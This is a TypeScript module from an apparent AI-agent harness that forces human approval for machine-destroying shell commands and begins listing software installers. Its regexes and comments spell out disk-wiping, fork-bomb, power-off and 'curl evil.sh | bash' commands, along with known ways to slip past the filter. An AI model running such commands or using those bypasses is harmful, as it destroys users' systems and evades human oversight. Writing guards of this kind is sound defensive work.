// catastrophic-command.ts — the hardline floor for run_command.
//
// A tiny set of shell commands that must NEVER be auto-approved, no matter what
// approval rule (or "Yolo" auto_approve toggle) is in effect. An LLM slip — or a
// malicious community skill — must not be able to wipe the disk, format a drive,
// or power off the machine silently. When a command matches, the approval gate
// forces a human decision (require_approval) even under Yolo. This mirrors the
// un-bypassable floor in the Hermes agent.
//
// Scope is deliberately narrow: only commands that are irreversibly destructive
// to the whole machine. Ordinary dangerous commands (deleting a project folder,
// killing a process) stay governed by the normal approval rules — the floor is
// not a general safety net, it is the last-resort circuit breaker.

import {
  CLEAR_CONTENT,
  CLEAR_ITEM,
  CLEAR_ITEM_PROPERTY,
  INVOKE_EXPRESSION,
  INVOKE_WEB_REQUEST,
  OUT_FILE,
  POWERSHELL_CLI,
  REMOVE_ITEM,
  REMOVE_ITEM_PROPERTY,
  SET_CONTENT,
  SET_LOCATION,
  START_BITS_TRANSFER,
  START_PROCESS,
  TEE_OBJECT,
  bindPsArguments,
  isPsParameter,
  isSplat,
  psHasUnknownParameter,
  psParameterNames,
  psPositional,
  psSwitch,
  psValues,
  type PsSignature,
  FOREACH_OBJECT,
  INVOKE_COMMAND,
} from './powershell-parameters';
import { SHELLS } from './shell-programs';

const FORK_BOMB = /:\s*\(\s*\)\s*\{\s*:\s*\|\s*:?\s*&\s*\}\s*;\s*:/;
const MKFS = /\bmkfs(\.\w+)?\b/i;
// [\s\S]*? (not [^\n]*) so a shell line-continuation between `dd ...\` and
// `of=/dev/sda` on the next line still matches — same newline-bypass class as
// the segment-split fix below, just for a top-level (non-anchored) pattern.
const DD_TO_DEVICE = /\bdd\b[\s\S]*?\bof=\/dev\/[a-z]/i;
// Power-state: unix (shutdown/reboot/halt/poweroff) + the PowerShell cmdlets
// that do the same thing on Windows (Stop-Computer / Restart-Computer).
const POWER_STATE = /\b(shutdown|reboot|halt|poweroff|stop-computer|restart-computer)\b/i;
const INIT_RUNLEVEL = /\binit\s+[06]\b/;
const OVERWRITE_DEVICE = />\s*\/dev\/(sd[a-z]|nvme\d|disk\d|hd[a-z])/i;
// diskpart: Windows disk-partitioning tool. Legitimate automation almost never
// needs it (its main destructive use is wiping/repartitioning a disk), so the
// floor just forces a human OK rather than trying to parse its sub-commands.
const DISKPART = /\bdiskpart\b/i;
// PowerShell disk cmdlets whose entire purpose is destructive (format/wipe/
// repartition a physical disk). Unambiguous cmdlet names — no plausible
// unrelated command shares them — so a plain \b regex is safe here, no
// token-anchoring needed.
const DISK_CMDLET = /\b(format-volume|clear-disk|initialize-disk)\b/i;
// awk with an inline program that shells out — `awk 'BEGIN{system("rm -rf /")}'`,
// `awk '{print | "sh"}'`. awk's program is opaque code (like `python -c`), so an
// awk that calls system()/getline-pipe/print-pipe into a shell can do anything.
// Plain text-processing awk (no system/pipe) is untouched. (A'2, audit followup.)
const AWK_CODE_EXEC =
  /\bawk\b[\s\S]*?(\bsystem\s*\(|\bgetline\b[^;]*\||["'][^"']*\|\s*["']?\s*(?:sh|bash|cmd))/i;

/** Strip one leading and/or trailing quote char — tokens coming out of a
 * `"quoted string"` (e.g. `powershell -Command "format C:"`) keep a stray
 * quote glued on after a plain whitespace split. */
function stripQuotes(token: string): string {
  return token.replace(/^["']|["']$/g, '');
}

/**
 * Collapse repeated path separators (`//` → `/`, `\\` → `\`) before any
 * pattern below runs. Every device/root/wildcard-target regex in this file
 * is written for a SINGLE separator (`\/dev\/sda`, `^[a-z]:\\?\*?$`, …); a
 * doubled or tripled separator (`rm -rf //`, `of=//dev/sda`, `C:\\`) reaches
 * the exact same target once the shell runs it, but dodges those regexes
 * outright. Normalizing here — once, up front — means every check below
 * stays a simple single-separator pattern instead of each needing its own
 * `/+` variant.
 */
function normalizeSlashes(s: string): string {
  return s.replace(/\/{2,}/g, '/').replace(/\\{2,}/g, '\\');
}

/** Last path segment, lowercased, `.exe`/`.com` suffix dropped — so
 * `/usr/bin/python3`, `C:\Python311\python.exe`, and `"python3"` all reduce
 * to the same bare interpreter name as a plain `python3`. */
function interpreterBasename(token: string): string {
  const t = stripQuotes(token);
  const base = t.split(/[\\/]/).pop() ?? t;
  return base.replace(/\.(exe|com)$/i, '').toLowerCase();
}

/**
 * The script extensions Windows runs a file by without them being written
 * (the default PATHEXT past `.exe`/`.com`) and PowerShell's `.ps1`. Package
 * managers ship their Windows entry points as such shims (`npm.cmd`,
 * `conda.bat`, `npm.ps1`), so the name as typed carries one (Codex, PR #710
 * pass 6). Unlike `.exe`, the word is then a script AND the program it is
 * named after: `wordUnits` reads both (pass 7).
 */
const SCRIPT_RUN_BY_NAME = /\.(cmd|bat|ps1|vbs|vbe|js|jse|wsf|wsh|msc)$/i;

export type InterpreterKind =
  | 'python'
  | 'node'
  | 'perl'
  | 'ruby'
  | 'php'
  | 'shell'
  | 'powershell'
  | 'expect';

/** The shells of `SHELLS` that read sh's language (`-c LINE`, a script, their input). */
const POSIX_SHELLS = new Set(
  SHELLS.filter((shell) => !['cmd', 'powershell', 'pwsh', 'wsl', 'busybox'].includes(shell)),
);

/** Classifies a bare interpreter name (already basename'd) into the kind of
 * inline-eval flag it accepts, or `null` if it isn't a recognized
 * general-purpose interpreter at all. */
export function interpreterKind(name: string): InterpreterKind | null {
  if (name === 'py' || /^python[0-9.]*$/.test(name)) return 'python';
  if (/^node(js)?$/.test(name)) return 'node';
  if (/^perl[0-9.]*$/.test(name)) return 'perl';
  if (/^ruby[0-9.]*$/.test(name)) return 'ruby';
  if (/^php[0-9.]*$/.test(name)) return 'php';
  if (POSIX_SHELLS.has(name)) return 'shell';
  if (name === 'powershell' || name === 'pwsh') return 'powershell';
  if (name === 'expect') return 'expect';
  return null;
}

/** True when `flag` (lowercased) is the inline-eval flag for `kind` — the
 * flag that hands the interpreter an opaque program as an ARGUMENT rather
 * than a script FILE (`-c`, `-e`, `-Command`, …). Deliberately narrow: `-m`,
 * `-File`, a bare script path, etc. run a named module/file, not arbitrary
 * inline text, so they're left to the normal (non-catastrophic) path. */
export function isInlineEvalFlag(kind: InterpreterKind, flag: string): boolean {
  switch (kind) {
    case 'python':
      return flag === '-c';
    case 'node':
      return flag === '-e' || flag === '--eval' || flag === '-p' || flag === '--print';
    case 'perl':
    case 'ruby':
      return flag === '-e';
    case 'php':
      return flag === '-r';
    case 'shell':
    case 'expect':
      return flag === '-c';
    case 'powershell':
      // `-Command` / `-EncodedCommand` as the powershell CLI binds them
      // (`-c`, `-Com`, `/c`, `--command`, `-e`, `-ec`…), #694.
      return (psParameterNames(flag, POWERSHELL_CLI) ?? []).some(
        (name) => name === 'command' || name === 'encodedcommand',
      );
    default:
      return false;
  }
}

/**
 * True when one command unit runs a general-purpose interpreter with the flag
 * that hands it an inline, opaque program (`python -c "…"`, `node -e "…"`,
 * `sh -c "…"`, `powershell -Command "…"`, …). The units are `commandUnits`',
 * so whatever runs it (`sudo -u x`, `wsl`, `timeout 5`, `cmd /q /c`…) is seen
 * through by the same reading as every kind of action (review of PR #682).
 * The payload is UNDECIDABLE from here (it could do anything, including a bare
 * `rm -rf /`), so this never tries to inspect it — matching alone forces the
 * approval gate. This is the fix for the "wrap it in an interpreter" bypass class.
 */
function isInlineEvalUnit(unit: readonly string[]): boolean {
  const program = unit[0] ?? '';
  if (
    isDecidedAtRunTime(program) ||
    redefinesCommand(unit) ||
    program === 'iex' ||
    program === 'invoke-expression'
  )
    return true;
  const kind = interpreterKind(program);
  // A shell's line is read by `shellLine`, the reading `commandUnits` unwraps
  // (`bash -lc`, `sh -ec`, `zsh -o x -c`), and only before its script file.
  if (kind === 'shell')
    return shellLine(unit.slice(1).map((text) => ({ text, quoted: false }))).length > 0;
  return kind !== null && unit.slice(1).some((t) => isInlineEvalFlag(kind, t.toLowerCase()));
}

/**
 * True when the command PIPES into a BARE general-purpose interpreter — the
 * `curl evil.sh | bash` / `echo 'rm -rf /' | python` class (A'1, audit
 * followup). A bare interpreter (no script FILE argument) reads its program from
 * stdin, so whatever the pipe feeds it is executed as opaque code — same
 * un-verifiable-payload danger as `bash -c`, so it belongs on the hard floor.
 *
 * Only flags it when the pipe TARGET is a bare interpreter: `… | grep x` (not an
 * interpreter) and `… | python script.py` (reads a FILE, stdin is just data) are
 * left alone. Splits on `|` on the already-slash-normalized command.
 */
function hasPipeIntoBareInterpreter(c: string, host: ShellHost | undefined): boolean {
  const parts = c.split('|');
  // Segment 0 is the pipe SOURCE; segments 1+ are the pipe TARGETS.
  for (let i = 1; i < parts.length; i++) {
    // The interpreter may be started by a wrapper (`| timeout 5 bash`, `| sudo
    // -u x sh`): read as every command is, by `commandUnits`.
    for (const unit of commandUnits(parts[i] ?? '', 0, topShell(host))) {
      if (!interpreterKind(unit[0] ?? '')) continue;
      // A non-flag argument after the interpreter is a script/module path → it
      // reads that FILE, not stdin, so the pipe is just data. Bare (only flags,
      // or nothing) → it executes stdin as code.
      const hasScriptArg = unit.slice(1).some((t) => !t.startsWith('-'));
      if (!hasScriptArg) return true;
    }
  }
  return false;
}

/**
 * True when `token` (already whitespace-split, quotes stripped) targets an
 * entire Windows drive or the whole machine: a bare drive root (`C:`, `C:\`,
 * `C:\*`), a bare separator/wildcard (`\`, `/`, `*`), or a system-wide env var
 * (`%SystemDrive%`, `%SystemRoot%`, `%USERPROFILE%`, `$env:SystemDrive`, …).
 * Mirrors the unix root/home/wildcard target check below — same "whole disk
 * or nothing" scope, never a relative subfolder.
 */
function isWindowsRootOrWildcardTarget(token: string): boolean {
  const t = stripQuotes(token);
  if (t === '*' || t === '\\' || t === '/') return true;
  if (/^[a-z]:\\?\*?$/i.test(t)) return true; // C:  C:\  C:\*  C:*
  if (/^%(systemdrive|systemroot|userprofile)%\\?\*?$/i.test(t)) return true;
  if (/^\$env:(systemdrive|systemroot|userprofile)\\?\*?$/i.test(t)) return true;
  return false;
}

/** Remove-Item and its aliases in PowerShell, of which del, erase, rd and rmdir are also cmd's own. */
const REMOVE_ITEM_NAMES: readonly string[] = [
  'remove-item',
  'ri',
  'rm',
  'del',
  'erase',
  'rd',
  'rmdir',
];

/**
 * The programs that delete files on Windows, macOS and Linux: ONE list, read
 * by the floor (the Remove-Item family, recursive and forced, on a whole disk)
 * and by the `delete_files` kind (any of them). Each kept its own list, and
 * they drifted: the floor knew `erase` and `ri`, the kind did not (#693).
 */
const DELETE_PROGRAMS: readonly string[] = [...REMOVE_ITEM_NAMES, 'unlink', 'shred', 'srm'];

/**
 * The provider cmdlets that erase what an item holds, or an entry of it, and
 * their aliases (#715, Nodal review pass 1): Clear-Content empties a file,
 * Clear-Item a value, Clear-ItemProperty and Remove-ItemProperty a registry
 * value. Deletions, read as Remove-Item is (`PIPELINE_TARGETS`); not the
 * floor's, whose list is Remove-Item's names.
 */
const PROVIDER_ERASERS: Readonly<Record<string, PsSignature>> = {
  'clear-content': CLEAR_CONTENT,
  clc: CLEAR_CONTENT,
  'clear-item': CLEAR_ITEM,
  cli: CLEAR_ITEM,
  'clear-itemproperty': CLEAR_ITEM_PROPERTY,
  clp: CLEAR_ITEM_PROPERTY,
  'remove-itemproperty': REMOVE_ITEM_PROPERTY,
  rp: REMOVE_ITEM_PROPERTY,
};

/** rm's short options (GNU, BSD/macOS, busybox), which a group (`-rfv`) may hold. */
const RM_SHORT_GROUP = /^-[dfiIPRrvWx]+$/;

/**
 * True when rm is given one of its options: a short one in a group (`-rf`,
 * `-Rfv`) matching `short`, or the long one abbreviated as getopt allows
 * (`--recursive`, `--rec`, `--f`).
 */
function rmOption(args: readonly string[], short: RegExp, long: string): boolean {
  return args.some(
    (a) =>
      (RM_SHORT_GROUP.test(a) && short.test(a.slice(1))) ||
      (a.length > 2 && a.startsWith('--') && long.startsWith(a.slice(2))),
  );
}

/**
 * True when `cmd` contains a catastrophic, machine-wide-destructive operation
 * that must always require explicit human approval (never auto-run).
 */
export function isCatastrophicCommand(
  cmd: string,
  host?: ShellHost,
  /** The shell a script's line is written for, over the host's (#635). */
  reader?: ScriptShell,
  /**
   * Read at command positions only: a string of a script (#635, review pass
   * 3 of #683) is a command only where it starts, so `print("Please reboot")`
   * is no reboot while `os.system("reboot")` is. A typed line keeps the
   * reading of the whole text it always had.
   */
  opts: { atCommandPositions?: boolean } = {},
): boolean {
  if (typeof cmd !== 'string' || cmd.trim() === '') return false;
  const shell = reader ?? topShell(host);
  // `shutdown --help` prints and exits (Reviewer A, #582 pass 2). Only the
  // long forms and `/?` here: `shutdown -h` HALTS the machine.
  const units = commandUnits(cmd, 0, shell).filter((u) => !runsAnother(u));
  // Text no reading follows (`UNFOLLOWED_UNITS`): what it runs is not known, so it
  // is held as a destroyer may be, whatever the rest of the line reads.
  if (units.some((u) => UNFOLLOWED_UNITS.has(u))) return true;
  if (
    units.length > 0 &&
    units.every((u) => u.length >= 2 && u.slice(1).every((t) => FLOOR_READ_FLAGS.has(t)))
  ) {
    return false;
  }
  const c = normalizeSlashes(cmd.trim());

  const destroyers = [
    MKFS,
    DD_TO_DEVICE,
    POWER_STATE,
    INIT_RUNLEVEL,
    OVERWRITE_DEVICE,
    DISKPART,
    DISK_CMDLET,
  ];
  const texts = opts.atCommandPositions
    ? commandUnits(c, 0, shell).map((u) => normalizeSlashes(u.join(' ')))
    : [c];
  if (
    FORK_BOMB.test(c) ||
    destroyers.some((re) =>
      texts.some((t) => (opts.atCommandPositions ? startsWithMatch(re, t) : re.test(t))),
    )
  ) {
    return true;
  }

  // NOTE (ComfyUI regression, 2026-07): inline interpreter-eval (`python -c`,
  // `node -e`, `sh -c`, `… | python`, awk-code) is NO LONGER on the
  // catastrophic hard floor. It is opaque but not inherently machine-wide
  // destructive — and hard-refusing it (even after approval) broke the
  // ubiquitous `curl … | python -c "json.load(...)"` idiom, systematically
  // killing legitimate workflows. It is now classed as DESTRUCTIVE/heavy
  // (isInlineInterpreterEvalCommand → isDestructiveOrHeavyCommand): gated for a
  // human at propose_confirm/destructive_gate, auto-run under fully_autonomous
  // (the owner's explicit "run everything" trust), and — crucially —
  // APPROVABLE (it executes after a human OK). Only the deterministic
  // machine-destroyers above stay refused-even-after-approval.

  // The checks below are ANCHORED on the program of each command the line
  // runs (`commandUnits`): what `cmd /q /c`, `powershell -Command`, `sh -c`,
  // `wsl`, `timeout 5`, `sudo -u x`, `nohup`, `xargs`… start is a command of
  // its own (review of PR #682: `wsl rm -rf /` and `timeout 5 rm -rf /`
  // passed the floor, its own list of wrappers knew only cmd, powershell, sh,
  // bash and sudo). A quoted mention (`echo "rm -rf /"`) is an argument of
  // `echo`, never a command, so no check can match it.
  for (const unit of commandUnits(c, 0, shell)) {
    const cmdWord = unit[0] ?? '';
    const args = unit.slice(1);
    const s = unit.join(' ');

    // `rm` (unix, and PowerShell's `rm` alias for Remove-Item) recursive +
    // force against a machine-wide target — unix root/home/wildcard (/, /*,
    // ~, $HOME, bare *) OR a Windows drive root/wildcard/system env var
    // (`rm -r -Force C:\`, `rm -Recurse -Fo C:\`, `cmd /c rm -rf /`). Read as
    // both programs read it: rm's options (`-rf`, `--recursive`, `--rec`) and
    // Remove-Item's parameters as PowerShell binds them (#694).
    if (/^rm$/i.test(cmdWord)) {
      const ps = bindPsArguments(args, REMOVE_ITEM);
      const recursive = rmOption(args, /[rR]/, 'recursive') || psSwitch(ps, 'recurse') !== false;
      const force = rmOption(args, /f/, 'force') || psSwitch(ps, 'force') !== false;
      if (recursive && force) {
        if (/\s--no-preserve-root\b/i.test(s)) return true;
        // a root / home / wildcard target among its arguments
        if (/(\s|=)(\/|\/\*|~|~\/\*?|\$HOME\/?\*?|\*)(\s|$|"|')/.test(s)) return true;
        if (args.some((t) => isWindowsRootOrWildcardTarget(t))) return true;
      }
    }

    // Windows `format <drive>:` — anchored on the program, so `clang-format`,
    // `git format-patch`, `dotnet format`, and the `Format-Table` cmdlet are
    // left alone. A LATER word must be a bare drive-letter target.
    if (
      /^format(\.(com|exe))?$/i.test(cmdWord) &&
      args.some((d) => /^[a-z]:([\\/]\*?)?$/i.test(d))
    ) {
      return true;
    }

    // Windows recursive+forced delete (Remove-Item and its names, `REMOVE_ITEM_NAMES`)
    // against a machine-wide target — mirrors the `rm` check above, same
    // root-only scope. `Remove-Item .\build -Recurse -Force` (a relative
    // project subfolder) must NOT match; only a drive root / wildcard / system
    // env var does. All of them are Remove-Item in PowerShell: its parameters
    // are read as PowerShell binds them (`-Fo`, `-r`, `-Force:$true`,
    // `–Force`), and `-Force:$false` sets nothing (#694).
    if (REMOVE_ITEM_NAMES.includes(cmdWord)) {
      const ps = bindPsArguments(args, REMOVE_ITEM);
      const psRecursiveForce = psSwitch(ps, 'recurse') !== false && psSwitch(ps, 'force') !== false;
      const cmdRecursiveForce = /\/s\b/i.test(s) && /\/q\b/i.test(s);
      if (psRecursiveForce || cmdRecursiveForce) {
        if (args.some((t) => isWindowsRootOrWildcardTarget(t))) return true;
      }
    }
  }

  return false;
}

/**
 * True when `cmd` runs an OPAQUE interpreter program the classifier can't
 * inspect: an inline-eval flag (`python -c`, `node -e`, `sh -c`,
 * `powershell -Command`, …), a pipe into a bare interpreter (`… | python`,
 * `curl … | bash`), or awk executing code (`awk '…system…'`). With or without
 * one pass-through leader (`sudo`/`env`/`cmd /c`) in front.
 *
 * This class is NO LONGER catastrophic (ComfyUI regression fix, 2026-07): it is
 * treated as DESTRUCTIVE/heavy — gated for a human at propose_confirm/
 * destructive_gate, auto-run under fully_autonomous, and APPROVABLE (it runs
 * after a human OK, unlike the machine-destroyers). The runner also uses this
 * predicate to tailor its approval-card wording.
 */
export function isInlineInterpreterEvalCommand(
  cmd: string,
  host?: ShellHost,
  reader?: ScriptShell,
): boolean {
  if (typeof cmd !== 'string' || cmd.trim() === '') return false;
  const c = normalizeSlashes(cmd.trim());
  if (AWK_CODE_EXEC.test(c) || hasPipeIntoBareInterpreter(c, host)) return true;
  return commandUnits(c, 0, reader ?? topShell(host)).some(isInlineEvalUnit);
}

// ── Destructive / heavy actions (for the `destructive_gate` autonomy level) ──────
// BROADER than the catastrophic floor: actions that mutate the machine in a heavy
// or hard-to-undo way — file deletions, software installs / large downloads, disk
// ops, process/service control, recursive permission changes, destructive VCS.
// Under `destructive_gate`, ordinary work auto-approves but THESE still require a
// human OK. We deliberately err toward asking: a false "ask" is cheap, a silent
// 13 GB install (`comfy install`) or an `rm` is not.
/**
 * A program's global options, between its name and its subcommand: `git -C
 * dir`, `git -c k=v`, `git --no-pager`, `docker --context x`, `docker compose
 * -f file`. A pattern that only knew the short form (`git lfs pull`, `docker
 * pull`) let the real forms through unclassified (Reviewer A, #582).
 */
const GLOBAL_OPTIONS = String.raw`(?:\s+(?:--[\w-]+(?:=\S+|\s+[^-\s]\S*)?|-[A-Za-z](?:\s+[^-\s]\S*)?))*`;

/** `program [global options] subcommand…`, the form every such tool accepts. */
function subcommand(program: string, rest: string): RegExp {
  return new RegExp(String.raw`\b(?:${program})${GLOBAL_OPTIONS}\s+${rest}`, 'i');
}

// ── What installs, updates or removes software (#693) ────────────────────────
// The `install_software` kind read "the word `install` after a known manager":
// every installer whose verb is an option (`msiexec /i`, `dpkg -i`, `rpm -Uvh`,
// `wusa x.msu`), every manager missing from the list and every remove or
// upgrade verb ran with no ask, and Codex kept finding the next one. Each
// operating system's standard ways to install, update or remove software or
// an OS component are now listed below, one table per family, from the
// platform's own documentation; ONE reader (`installsSoftware`) reads them all.
// A simulation (`apt-get -s`, `rpm --test`, `-WhatIf`) asks like the install
// it simulates (Codex, PR #710 pass 2): whether a word is that flag or the
// value of the option before it (`apt-get -c --simulate install x` installs,
// with `--simulate` as its config file; `Install-Module '-WhatIf'` installs a
// module of that name, and a unit has lost its quotes) takes each program's
// whole option grammar, and what the text cannot establish asks. A read stays
// unflagged by naming no action: no verb of the program among its words
// (`apt list`, `winget show`; which word is the subcommand takes the same
// grammar), a mode with no action letter (`rpm -q x`, `pacman -Qi x`).
// A word decided at run time (`apt-get "$verb" x`, `winget %V% x`, a splat)
// could be any verb, so it asks (Codex, PR #710 pass 3); a program name
// decided at run time is inline code already (`isInlineEvalUnit`).

/** How one program says it installs, updates or removes software. */
interface Installer {
  /** Its subcommands that do, wherever they stand (`apt-get -y install`); a nested one in words, in order (`uv pip install`). */
  verbs?: readonly string[];
  /** Its options that do, by name (`--install`, msiexec's `/i`, installer's `-target`); `f*` is every name that starts with `f`. */
  options?: readonly string[];
  /**
   * Its short options that do, alone or in a group (`rpm -Uvh`). Letters are
   * case-sensitive: `rpm -e` erases, `rpm -E` evaluates a macro.
   */
  letters?: string;
  /** Every word that is not an option is a package it installs (`emerge atom`, `wusa x.msu`). */
  operands?: true;
  /** It does whenever it runs: a cmdlet, a setup program. */
  always?: true;
  /**
   * Run with no command it installs. `options`: its options only modify that
   * install (`yarn --frozen-lockfile`, `bundle`), unless one only prints its
   * version or its help (`-v`, `--version`, `-h`, `--help`). `alone`: an
   * option is itself the operation (`yay -Q` queries), so only `yay` alone does.
   */
  bare?: 'options' | 'alone';
  /**
   * It takes any unambiguous start of a command as that command (Symfony
   * Console's `composer req`): an operand of three letters or more that
   * starts one of its one-word verbs does.
   */
  abbreviations?: true;
  /**
   * How its options are written. `gnu` (the default): `--name[=v]`, `-abc` a
   * group of letters, `--` ends them. `windows`: `/name[:v]` or `-name[:v]`.
   * `single-dash`: `-name[=v]`.
   */
  syntax?: 'gnu' | 'windows' | 'single-dash';
}

/** A cmdlet that installs, updates or removes software or an OS component. */
const CMDLET: Installer = { always: true };

/**
 * Windows. Sources (Microsoft Learn): msiexec (windows-commands/msiexec:
 * /i /package /a /x /uninstall /f[pocdaumsv] /p /update /j[u|m]); wusa ("Windows
 * Update Standalone Installer": `wusa x.msu`, /uninstall [/kb:N]); DISM
 * (dism-operating-system-package-servicing, -capabilities,
 * enable-or-disable-windows-features, -app-package-servicing, -driver-servicing);
 * pnputil (/add-driver /delete-driver, the legacy -a -d -i); the PowerShell
 * modules PowerShellGet, PackageManagement, Microsoft.PowerShell.PSResourceGet
 * (isres, usres, udres), Appx, Dism, ServerManager (Add-/Remove-WindowsFeature
 * are the names before Windows Server 2012), LanguagePackManagement; the
 * aliases are those `Get-Alias -Definition` lists on Windows 11 (inmo, upmo,
 * Add-AppPackage, Add-MsixPackage…). winget (install|add, uninstall|remove|rm,
 * upgrade|update, import, configure, repair), Chocolatey (install, uninstall,
 * upgrade), Scoop.
 * `msiexec /?`, `wusa /?` and `pnputil /enum-drivers` name no action: they
 * need no entry to stay unflagged.
 */
const WINDOWS_INSTALLERS: Record<string, Installer> = {
  msiexec: {
    syntax: 'windows',
    options: ['i', 'package', 'a', 'x', 'uninstall', 'f*', 'p', 'update', 'j*'],
  },
  wusa: { syntax: 'windows', operands: true, options: ['uninstall'] },
  dism: {
    syntax: 'windows',
    options: [
      'add-package',
      'remove-package',
      'enable-feature',
      'disable-feature',
      'add-capability',
      'remove-capability',
      'add-provisionedappxpackage',
      'remove-provisionedappxpackage',
      'add-driver',
      'remove-driver',
    ],
  },
  pnputil: { syntax: 'windows', options: ['add-driver', 'delete-driver', 'a', 'd', 'i'] },
  'install-module|inmo|uninstall-module|update-module|upmo': CMDLET,
  'install-script|uninstall-script|update-script': CMDLET,
  'install-package|uninstall-package|install-packageprovider': CMDLET,
  'install-psresource|isres|uninstall-psresource|usres|update-psresource|udres': CMDLET,
  'add-appxpackage|add-apppackage|add-msixpackage|remove-appxpackage|remove-apppackage|remove-msixpackage':
    CMDLET,
  'install-windowsfeature|add-windowsfeature|uninstall-windowsfeature|remove-windowsfeature':
    CMDLET,
  'add-appxprovisionedpackage|add-appprovisionedpackage|add-provisionedapppackage|add-provisionedappxpackage':
    CMDLET,
  'remove-appxprovisionedpackage|remove-appprovisionedpackage|remove-provisionedapppackage|remove-provisionedappxpackage':
    CMDLET,
  'add-windowspackage|remove-windowspackage|add-windowscapability|remove-windowscapability': CMDLET,
  'enable-windowsoptionalfeature|disable-windowsoptionalfeature': CMDLET,
  'add-windowsdriver|remove-windowsdriver|install-language|uninstall-language': CMDLET,
  winget: {
    verbs: [
      'install',
      'add',
      'uninstall',
      'remove',
      'rm',
      'upgrade',
      'update',
      'import',
      'configure',
      'repair',
    ],
  },
  choco: { verbs: ['install', 'uninstall', 'upgrade', 'update'] },
  // Chocolatey 1's shortcuts: `cinst x` is `choco install x`.
  'cinst|cuninst|cup': { always: true },
  scoop: { verbs: ['install', 'uninstall', 'update', 'reset', 'cleanup'] },
  // A setup program run directly: the name Windows installers ship under.
  setup: { always: true },
};

/**
 * macOS. Sources: installer(8) (`-pkg x -target /` installs), softwareupdate(8)
 * (-i --install, --install-rosetta, --fetch-full-installer), the Homebrew
 * manpage (install, reinstall, uninstall|remove|rm, upgrade, autoremove), MacPorts port(1) (install,
 * uninstall, upgrade, activate, deactivate, selfupdate), mas (install,
 * uninstall, upgrade, purchase, lucky).
 */
const MACOS_INSTALLERS: Record<string, Installer> = {
  installer: {
    syntax: 'single-dash',
    options: ['target'],
  },
  softwareupdate: {
    options: ['install', 'install-rosetta', 'fetch-full-installer'],
    letters: 'i',
  },
  brew: {
    // `update` fetches Homebrew itself, not only its formula lists (#710 pass 9).
    // `bundle` installs a Brewfile; `link`/`unlink` switch an installed version.
    verbs: [
      'install',
      'reinstall',
      'uninstall',
      'remove',
      'rm',
      'upgrade',
      'autoremove',
      'update',
      'bundle',
      'link',
      'unlink',
    ],
  },
  port: { verbs: ['install', 'uninstall', 'upgrade', 'activate', 'deactivate', 'selfupdate'] },
  mas: { verbs: ['install', 'uninstall', 'upgrade', 'purchase', 'lucky'] },
};

/**
 * Linux and the BSDs. Sources: apt-get(8) (install, reinstall, remove, purge,
 * upgrade, dist-upgrade, dselect-upgrade, autoremove, autopurge, build-dep,
 * satisfy), apt(8) (full-upgrade), aptitude (safe-upgrade); dpkg(1) (-i -r -P
 * --install --remove --purge --unpack --configure); rpm(8) (-i -U -F -e and
 * long forms); the DNF
 * command reference (install|in, remove|rm, upgrade|up, upgrade-minimal,
 * downgrade|dg, reinstall|rei, autoremove, distro-sync|dsync, swap, group,
 * module, history undo|redo|rollback|replay) and yum's older names;
 * zypper(8) (install|in, source-install|si, install-new-recommends|inr,
 * remove|rm, removeptf, update|up, dist-upgrade|dup, patch, verify|ve,
 * purge-kernels); pacman(8) (-S -R -U); apk(8) (add, del, fix, upgrade);
 * emerge(1) (an atom merges, -C -c -P --unmerge --depclean --prune); snap,
 * flatpak, PackageKit's pkcon; nix-env(1) (-i -e -u, --rollback, -G
 * --switch-generation, --set) and `nix profile`; FreeBSD pkg(8) (install,
 * add, delete, remove, upgrade, autoremove).
 */
const LINUX_INSTALLERS: Record<string, Installer> = {
  'apt-get|apt|aptitude': {
    verbs: [
      'install',
      'reinstall',
      'remove',
      'purge',
      'upgrade',
      'full-upgrade',
      'dist-upgrade',
      'safe-upgrade',
      'dselect-upgrade',
      'autoremove',
      'autopurge',
      'build-dep',
      'satisfy',
    ],
  },
  dpkg: {
    options: ['install', 'remove', 'purge', 'unpack', 'configure'],
    letters: 'irP',
  },
  rpm: {
    options: ['install', 'upgrade', 'freshen', 'erase', 'reinstall'],
    letters: 'iUFe',
  },
  'dnf|dnf5|yum|microdnf|tdnf': {
    verbs: [
      'install',
      'in',
      'install-n',
      'install-na',
      'install-nevra',
      'localinstall',
      'reinstall',
      'rei',
      'remove',
      'rm',
      'erase',
      'remove-n',
      'remove-na',
      'remove-nevra',
      'upgrade',
      'up',
      'update',
      'upgrade-minimal',
      'up-min',
      'update-minimal',
      'downgrade',
      'dg',
      'autoremove',
      'distro-sync',
      'dsync',
      'distrosync',
      'swap',
      'groupinstall',
      'groupremove',
      'groupupdate',
      'group install',
      'group remove',
      'group upgrade',
      'group update',
      'groups install',
      'groups remove',
      'grp install',
      'grp remove',
      'module install',
      'module update',
      'module remove',
      'module switch-to',
      'history undo',
      'history redo',
      'history rollback',
      'history replay',
    ],
  },
  zypper: {
    verbs: [
      'install',
      'in',
      'source-install',
      'si',
      'install-new-recommends',
      'inr',
      'remove',
      'rm',
      'removeptf',
      'rmptf',
      'update',
      'up',
      'dist-upgrade',
      'dup',
      'patch',
      'verify',
      've',
      'purge-kernels',
    ],
  },
  pacman: {
    options: ['sync', 'remove', 'upgrade'],
    letters: 'SRU',
  },
  // The AUR helpers take pacman's operations; alone they upgrade the system.
  'yay|paru': {
    options: ['sync', 'remove', 'upgrade'],
    letters: 'SRU',
    bare: 'alone',
  },
  // Void's xbps, OpenBSD's pkg_add/pkg_delete: they do whenever they run.
  'xbps-install|xbps-remove|pkg_add|pkg_delete': { always: true },
  apk: { verbs: ['add', 'del', 'fix', 'upgrade'] },
  emerge: {
    operands: true,
    options: ['unmerge', 'depclean', 'prune'],
    letters: 'CcP',
  },
  snap: { verbs: ['install', 'remove', 'refresh', 'revert'] },
  flatpak: { verbs: ['install', 'uninstall', 'update'] },
  pkcon: { verbs: ['install', 'install-local', 'remove', 'update', 'upgrade-system'] },
  'nix-env': {
    options: ['install', 'uninstall', 'upgrade', 'rollback', 'switch-generation', 'set'],
    letters: 'ieuG',
  },
  nix: {
    verbs: [
      'profile install',
      'profile add',
      'profile remove',
      'profile upgrade',
      'profile rollback',
      'upgrade-nix',
    ],
  },
  pkg: { verbs: ['install', 'add', 'delete', 'remove', 'upgrade', 'autoremove', 'bootstrap'] },
};

/**
 * npm, pnpm, yarn and bun: what installs, updates or removes a package of the
 * project, a global one, the manager itself (`self-update`, `set version`,
 * Yarn 1's `policies set-version`) or a Node.js runtime (`pnpm env use`).
 * npm's documented aliases are listed (`inst`, `isntall`, `ic`, `cit`, `ln`…).
 */
const NODE_VERBS: readonly string[] = [
  'install',
  'i',
  'in',
  'ins',
  'inst',
  'insta',
  'instal',
  'isnt',
  'isnta',
  'isntal',
  'isntall',
